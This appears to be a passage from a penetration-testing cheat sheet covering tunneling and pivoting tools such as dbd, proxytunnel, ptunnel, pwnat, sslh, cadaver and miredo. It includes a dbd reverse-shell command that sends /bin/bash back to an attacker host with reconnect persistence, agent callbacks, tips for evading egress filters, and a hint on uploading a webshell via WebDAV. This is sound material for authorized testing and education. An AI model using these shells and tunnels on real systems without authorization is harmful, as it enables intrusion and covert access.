**Purpose**: same family as sbd (AES-CBC-128 + HMAC-SHA1); its signature features are `-r` scheduled auto-reconnect and `-D` daemon mode, suited to scenarios needing long-lived callbacks.
**Installation**: `sudo apt install dbd`
**Use cases**: shell stability comes first and the target is allowed to keep a resident process that calls back on a timer.

```bash
# 官网示例:目标端(客户端)每 2400 秒重连、后台运行、执行 bash、回连攻击端 8080
dbd -r 2400 -D on -v -e /bin/bash <attacker-ip> 8080
# 攻击端(服务端)监听 8080
dbd -l -p8080 -v
```

**Practical tips**:
- `-D on` backgrounding + `-r <sec>` periodic reconnect = crude persistence; real red teams need stealthier approaches — this usage fits short-term session keep-alive better.
- Both `-p` glued to the port (`-p8080`) and the spaced form (`-p 8080`) are accepted.

### proxytunnel — Take SSH (and Other TCP) Through HTTP(S) Proxies

**Purpose**: tunnels via CONNECT through standard HTTP/HTTPS proxies, carrying arbitrary TCP (most typically SSH) out of office networks that only allow HTTP egress.
**Installation**: `sudo apt install proxytunnel`
**Use cases**: the intranet can only reach the Internet through an HTTP proxy (3128/8080) and you need SSH straight to an external box.

```bash
# 一次性:经代理打通到目标 22,并在本地 2222 开入口
proxytunnel -p <proxy-ip>:3128 -d <target-ip>:22 -a 2222
ssh -p 2222 <user>@localhost

# 配合 ProxyCommand(推荐,一条 SSH 直接走代理)
ssh -o ProxyCommand="proxytunnel -p <proxy-ip>:3128 -d %h:%p" <user>@<target-ip>

# 代理需要认证时
proxytunnel -p <proxy-ip>:3128 -P <proxy-user>:<proxy-pass> -d <target-ip>:22 -a 2222
```

**Practical tips**:
- `-p` is the proxy address and `-d` the final destination — do not swap them; `%h:%p` is filled in by ssh with the target host and port.
- CONNECT usually only allows 443; an SSH target on a non-443 port will be refused by the proxy — have the target side multiplex SSH onto 443 with sslh.
- It only solves the "out through the proxy" hop; you can still layer chisel/ligolo afterwards.

### ptunnel — TCP over ICMP (Last Resort for Ping-Only Egress)

**Purpose**: encapsulates TCP connections inside ICMP echo request/reply to pierce networks that allow only ping.
**Installation**: `sudo apt install ptunnel`
**Use cases**: TCP/UDP/DNS all blocked, only ICMP permitted (e.g. some ICS/isolated networks).

```bash
# 服务端(能双向 ICMP 的跳板机)
sudo ptunnel
# 客户端(受限网络内):本地 8000 → 经跳板 → 目标 22
sudo ptunnel -p <jump-ip> -lp 8000 -da <target-ip> -dp 22
ssh -p 8000 <user>@localhost
```

**Practical tips**:
- `-p` is the jump host (ICMP server), `-lp` the local listen port, and `-da/-dp` the final destination address/port.
- Both sides need root (raw socket); throughput is low and latency high — use it only to build the first hop, then stack an SSH tunnel on top.
- In adversarial environments, abnormal ICMP payload sizes are a clear tell; in authorized tests use it to validate monitoring.

### pwnat — NAT-to-NAT Direct Connection (No Port Forwarding/DMZ Needed)

**Purpose**: when both sides sit behind NAT with no port forwarding at all, uses ICMP to let client and server establish a UDP path, then carries a TCP proxy over it.
**Installation**: `sudo apt install pwnat`
**Use cases**: no public listening port available (the attacker box is also behind NAT), and target and attacker must connect directly while both remain "invisible" to each other.

```bash
# 官网示例:服务端(公网侧)server 模式监听 8080
pwnat -s 8080
# 客户端(NAT 后):本地 8000 → 经服务端 8080 → google.com:80
pwnat -c 8000 <server-ip> 8080 google.com 80

# 实战:把目标内网 SSH 引到本地
pwnat -c 2222 <server-ip> 8080 <internal-ip> 22
ssh -p 2222 <user>@localhost
```

**Practical tips**:
- The server needs no prior knowledge of the client's address; client connections are forwarded by the server to the real target given as the fourth argument.
- With a public VPS, prefer chisel/ligolo; pwnat solves the special "both sides behind NAT" case.

### sslh — Protocol Multiplexer (Port 443 as Both SSH and HTTPS)

**Purpose**: recognizes SSH/TLS/OpenVPN/tinc/XMPP by first-packet signatures and routes them to different backends, letting restricted networks (443-only) still accept SSH.
**Installation**: `sudo apt install sslh`
**Use cases**: the egress policy only allows 443, but the same server needs SSH/OpenVPN access.

```bash
# 前台运行:443 上同时服务 SSH 与 TLS
sudo sslh -f -p 0.0.0.0:443 --ssh 127.0.0.1:22 --tls 127.0.0.1:8443
# 还可加:--openvpn <ip>:1194 --tinc ... --xmpp ...

# 常驻:改 /etc/default/sslh 后
sudo systemctl restart sslh
```

**Practical tips**:
- Move the real HTTPS service back to an internal port like 8443 and hand 443 to sslh; SSH clients connect as usual with `ssh -p 443 <ip>`.
- Combined with proxytunnel: intranet allows only CONNECT 443 → proxytunnel to sslh → demultiplexed into SSH.
- Detecting it: `nmap -sV -p 443` shows multi-protocol signatures, so blue teams can spot port multiplexing this way.

### cadaver — Command-line WebDAV Client (Interactive)

**Purpose**: an ftp-like WebDAV client: upload/download/inline editing, move/copy, collection (directory) add/remove, property operations, and resource locking.
**Installation**: `sudo apt install cadaver`
**Use cases**: the target exposes WebDAV (IIS/SharePoint/Nextcloud etc.) and you need command-line bulk operations or PUT-permission validation.

```bash
# 连接目标 WebDAV
cadaver http://<target-ip>/webdav/
# 交互命令(类 ftp):ls cd get put delete copy move mkcol lock unlock edit
dav:/webdav/> put <file>
dav:/webdav/> get <remote-file>
dav:/webdav/> mkcol testdir
```

**Practical tips**:
- Successful PUT/MOVE means a webshell upload may be possible (chained with extension/parsing quirks) — the core verdict point of a WebDAV assessment.
- For authenticated sites, enter credentials when prompted at connect time, or put them in the URL: `cadaver http://<user>:<pass>@<target>/dav/`.
- To stand up WebDAV on your own side use goshs `-w`; cadaver and it are the two ends of that exchange.

### miredo — Teredo IPv6 Tunnel Client (IPv6 Egress from Behind NAT)

**Purpose**: implements the Teredo (RFC 4380) client, encapsulating IPv6 in UDP/IPv4 to give hosts behind NAT IPv6 connectivity; can also act as a Teredo relay.
**Installation**: `sudo apt install miredo`
**Use cases**: when the target/intranet only bothers filtering IPv4 and the IPv6 egress becomes an overlooked channel — connectivity and validation.

```bash
# 启动客户端(创建 teredo 接口)
sudo miredo
ip -6 addr show teredo      # 确认拿到 2001:0::/32 的 Teredo 地址
ping6 -c 3 <ipv6-target>
```

**Practical tips**:
- After giving the target an IPv6 exit, layer chisel/ligolo IPv6 listeners on top to evade IPv4-only ACLs.
- Configuration lives in `/etc/miredo/miredo.conf` (public Teredo servers by default); for setups with no Internet dependency, self-host the server with the `miredo-server` package.

## Remaining Tools — Quick Reference

| Tool | One-Line Purpose | Package | Most Common Command |
|---|---|---|---|
| chisel-common-binaries | Cross-platform prebuilt chisel binaries (including the Windows .exe) | `chisel-common-binaries` | `dpkg -L chisel-common-binaries` (locate the exe, then transfer and run on the target) |
| ligolo-agent | ligolo-ng target-side component (calls back to the proxy) | `ligolo-ng` | `sudo ligolo-agent -connect <ip>:11601 -ignore-cert -retry` |
| ligolo-proxy | ligolo-ng attacker-side component (interactive console) | `ligolo-ng` | `sudo ligolo-proxy -selfcert -laddr 0.0.0.0:11601` |
| ligolo-ng-common-binaries | Cross-platform prebuilt ligolo agent/proxy binaries | `ligolo-ng-common-binaries` | `dpkg -L ligolo-ng-common-binaries` |
| ligolo-mp-client | ligolo-mp multi-operator collaboration client | `ligolo-mp` | `ligolo-mp-client` |
| dns2tcpd | dns2tcp server (DNS side) | `dns2tcp` | `sudo dns2tcpd -f .dns2tcpdrc` |
| dns2tcpc | dns2tcp client (target side, no root needed) | `dns2tcp` | `dns2tcpc -f .dns2tcprc` |
| iodine-client-start | Helper script that auto-starts the iodine client tunnel from config | `iodine` | `iodine-client-start` |
| raven | Self-contained HTTP file "upload receiver" server (fills the http.server download-only gap) | `raven` | `raven 0.0.0.0 8080` |
| udptunnel | Wraps UDP inside a TCP tunnel (run UDP services in TCP-only egress) | `udptunnel` | `udptunnel -s <port>` (server) / `udptunnel <port> <ip> <port>` (client) |
| minicom | Serial terminal (serial console when pivoting via hardware/embedded) | `minicom` | `sudo minicom -D /dev/ttyUSB0 -b 115200` |
| miredo-server | Teredo server (self-hosted hole punching/relay) | `miredo-server` | `sudo miredo-server` |

---

This file is for penetration testing with written authorization, CTF competitions, and security education scenarios only.
